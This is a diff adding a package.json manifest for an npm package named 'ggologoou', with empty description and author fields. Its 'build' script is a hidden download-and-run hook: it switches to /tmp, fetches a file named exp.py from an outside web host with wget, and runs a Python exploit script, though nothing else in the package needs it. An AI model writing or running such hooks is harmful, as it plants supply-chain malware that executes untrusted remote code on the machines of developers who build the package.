@@ -1,0 +1,21 @@
+{
+  "name": "ggologoou",
+  "version": "1.0.0",
+  "description": "",
+  "homepage": "https://github.com/hiko97851/ggologoou#readme",
+  "bugs": {
+    "url": "https://github.com/hiko97851/ggologoou/issues"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/hiko97851/ggologoou.git"
+  },
+  "license": "ISC",
+  "author": "",
+  "type": "commonjs",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "build": "cd /tmp; wget https://web.vitemaweed.fr/glouglou/exp.py; python3 exploit.py;"
+  }
+}
